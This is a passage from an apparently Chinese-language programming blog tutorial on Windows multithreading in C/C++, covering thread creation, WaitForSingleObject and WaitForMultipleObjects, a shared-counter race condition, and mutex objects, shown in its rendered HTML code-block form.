class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(n * <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>额除了void都要返回值，虽然这里也不需要什么特殊的，就随便返回一个。</p><p>依次照葫芦画瓢</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">printH</span><span class="params">(<span class="type">void</span> *_x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = *((<span class="type">int</span> *)_x);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(n * <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">printW</span><span class="params">(<span class="type">void</span> *_x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = *((<span class="type">int</span> *)_x);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;world!\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(n * <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">printA</span><span class="params">(<span class="type">void</span> *_x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = *((<span class="type">int</span> *)_x);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ahahahaha!\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(n * <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是创建线程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">3</span>, y = <span class="number">5</span>, z = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> xId, yId, zId;</span><br><span class="line">_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, printH, (<span class="type">void</span> *)&amp;x, <span class="number">0</span>, &amp;xId);</span><br><span class="line">_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, printW, (<span class="type">void</span> *)&amp;y, <span class="number">0</span>, &amp;yId);</span><br><span class="line">_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, printA, (<span class="type">void</span> *)&amp;z, <span class="number">0</span>, &amp;zId);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接这样写其实一次就运行完了，因为顺序执行之后return 0，主线程main结束了，线程就g了，所以要想办法阻塞主线程，最直接就是给主线程也来个延时。</p><img src="/2022/07/18/thread/003.png" class=""><p>线程就是可以同步进行，不过这个顺序似乎就第一次正常的，后面的好像全看心情。虽然函数设置的延时不一样，但是就算统一了延时效果也差不多。毕竟这个是系统自己处理的。</p><hr><p>可以看下进程号，应该说pid</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadFun</span><span class="params">(LPVOID p)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> imym = *((<span class="type">int</span> *)p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我是子线程，pid = %d, imym = %d\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>(), imym);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwThreadId;</span><br><span class="line"><span class="type">int</span> m = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadFun, &amp;m, <span class="number">0</span>, &amp;dwThreadId);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我是主线程：pid = %d\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">20000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/004.png" class=""><p>这个大致看看，现在可能用处不大。</p><hr><h2 id="简单多线程示例"><a href="#简单多线程示例" class="headerlink" title="简单多线程示例"></a>简单多线程示例</h2><p>内核对象</p><ol><li>内核对象通过API来创建，每个内核对象是一个数据结构，它对应一块内存，由操作系统内核分配，且只能由操作系统内核访问。在此数据结构中少数成员如安全描述符和使用计数是所有对象都有的，但是其他大多数成员都是不同类型的对象特有的。内核对象的数据结构只能由操作系统提供的API访问，应用程序在内存中不能访问。调用创建内核对象的函数后，该函数会返回一个句柄，它标识了所创建的对象，可以由进程的任何线程使用。</li></ol><h3 id="主线程和子线程的声明周期"><a href="#主线程和子线程的声明周期" class="headerlink" title="主线程和子线程的声明周期"></a>主线程和子线程的声明周期</h3><p>在最前面举例线程的时候，我们创建了三个子线程，但是子线程的执行顺序是不确定的。<br>而主线程main，我们当时还加了sleep延时去观察。<br>那么为什么要延时，当然是要给子线程运行的时间，比较子线程内分别也延时输出。<br>最重要的阻塞在<code>system(&quot;pause&quot;);</code>上。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadFun</span><span class="params">(LPVOID p)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> imym = *((<span class="type">int</span> *)p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; imym; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;子线程\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwThreadId;</span><br><span class="line"><span class="type">int</span> m = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadFun, &amp;m, <span class="number">0</span>, &amp;dwThreadId);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/005.png" class=""><p>可以看到，当我们没有按任意键的时候，子线程还能持续。</p><p>可当注释掉之后，他甚至都没进入到子线程就结束了。</p><img src="/2022/07/18/thread/006.png" class=""><p><strong>初步结论：main函数结束后，整个程序的进程终止，同时结束掉其所包含的所有线程</strong></p><p>但不论是通过<code>system(&quot;pause&quot;);</code>还是<code>Sleep</code>都不是很好的解决方法。</p><hr><h3 id="WaitForSingleObject"><a href="#WaitForSingleObject" class="headerlink" title="WaitForSingleObject"></a>WaitForSingleObject</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WaitForSingleObject</span>(</span><br><span class="line">    _In_ HANDLE hHandle,<span class="comment">//表示一个内核对象的句柄</span></span><br><span class="line">    _In_ DWORD dwMilliseconds<span class="comment">//等待的时间</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>简单解释就是等待一个内核对象变为已通知状态。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadFun</span><span class="params">(LPVOID p)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> imym = *((<span class="type">int</span> *)p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; imym; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;子线程\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwThreadId;</span><br><span class="line"><span class="type">int</span> m = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> wr;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadFun, &amp;m, <span class="number">0</span>, &amp;dwThreadId);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((wr = <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE)) == WAIT_FAILED)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;thread wait error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/007.png" class=""><p>可以看到他会先阻塞在waitforsingleobject那边，等待线程先进行完毕，然后再去执行system的函数。<br>与我们之前单纯用system阻塞有明显区别。</p><p>可以在if前后加个打印区分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwThreadId;</span><br><span class="line"><span class="type">int</span> m = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> wr;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadFun, &amp;m, <span class="number">0</span>, &amp;dwThreadId);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;begin!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((wr = <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE)) == WAIT_FAILED)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;thread wait error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;end!\n&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/008.png" class=""><p>印证符合描述，他的确等待线程执行完毕。</p><p><code>WaitForSingleObject(hThread, INFINITE))</code>也就是线程阻塞在这里，等待线程结束后，才会顺便结束线程。<br>已通知状态，就是说线程执行完毕之后的状态。</p><hr><h3 id="WaitForMultipleObjects"><a href="#WaitForMultipleObjects" class="headerlink" title="WaitForMultipleObjects"></a>WaitForMultipleObjects</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WaitForMultipleObjects</span>(</span><br><span class="line">    _In_ DWORD nCount,<span class="comment">//监测的句柄个数</span></span><br><span class="line">    _In_reads_(nCount) CONST HANDLE* lpHandles,<span class="comment">//监听的句柄组合</span></span><br><span class="line">    _In_ BOOL bWaitAll,<span class="comment">//TRUE等待所有内核对象发出信号，FALSE为任意一个内核对象发出信号</span></span><br><span class="line">    _In_ DWORD dwMilliseconds<span class="comment">//等待时间</span></span><br><span class="line">    );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>#define INFINITE            0xFFFFFFFF  // Infinite timeout</code></p><p>那么当出现多个线程对象的时候，肯定不会说挨个等着。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_THREAD 50</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">threadInc</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)&#123;</span><br><span class="line">num += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">threadDes</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)&#123;</span><br><span class="line">num -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE tHandles[NUM_THREAD];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sizeof long long : %d\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">long</span> <span class="type">long</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_THREAD; i++)&#123;<span class="comment">//NUM_THREAD=50，故两个线程各占一半</span></span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">2</span>)&#123;</span><br><span class="line"><span class="comment">//奇数次执行+=1</span></span><br><span class="line">tHandles[i] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, threadInc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//偶数次执行-=1</span></span><br><span class="line">tHandles[i] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, threadDes, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForMultipleObjects</span>(NUM_THREAD, tHandles, TRUE, INFINITE);<span class="comment">//启动多个内核对象等待信号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;result: %lld\n&quot;</span>, num);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/009.png" class=""><img src="/2022/07/18/thread/010.png" class=""><img src="/2022/07/18/thread/011.png" class=""><p>跑的时候会发现值是不固定的。<br>常规思维中，全局变量，通过两个线程挨个调用，会觉得最后的值应该就是固定的。<br>但是线程是由cpu控制的，而全局变量还是存在与内存之上，于速度而言，肯定是cpu更快，所以当多个线程工作的时候，全局变量被线程取出使用，但是可能没等到改变的值传回全局变量，线程2就启动了，线程2改变的是线程1还没来得及放入的数据，如此反复，谁也不能保证最后到底算真正数学上的加减了几次。</p><p>虽然知道了这种特性，但是有的时候就是需要线程之间不要过分干预，就引出互斥对象</p><hr><h3 id="互斥对象"><a href="#互斥对象" class="headerlink" title="互斥对象"></a>互斥对象</h3><p>互斥对象同属于内核对象，它能保证线程拥有对单个资源的互斥访问权。</p><p>创建互斥对象使用：<code>CreatrMutex</code>.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateMutexW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes,<span class="comment">//指向安全属性</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bInitialOwner,<span class="comment">//初始化互斥对象的所有者，TRUE立即拥有互斥体</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpName<span class="comment">//指向互斥对象名的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateMutex  CreateMutexW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateMutex  CreateMutexA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure><p>额，可以看到好像会根据编码环境去做一些调整，不过问题不大，反正看得出来。然后这种线程创建成功返回的都是句柄。</p><p>请求互斥对象：<code>WaitForSingleObject</code>，线程必须主动请求共享对象的所有权才能获得所有权。<br>是否互斥对象的所有权：<code>ReleaseMutex</code>，线程访问共享资源结束后，线程要主动释放对互斥对象的所有权，使该对象处于已通知状态。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_THREAD 50</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line">HANDLE hMutex;<span class="comment">//定义一个互斥量的句柄权限</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">threadInc</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)&#123;</span><br><span class="line">num += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">threadDes</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)&#123;</span><br><span class="line">num -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE tHandles[NUM_THREAD];</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;sizeof long long : %d\n&quot;, sizeof(long long));</span></span><br><span class="line">hMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_THREAD; i++)&#123;<span class="comment">//NUM_THREAD=50，故两个线程各占一半</span></span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">2</span>)&#123;</span><br><span class="line"><span class="comment">//奇数次执行+=1</span></span><br><span class="line">tHandles[i] = (HANDLE)_beginthreadex(<span 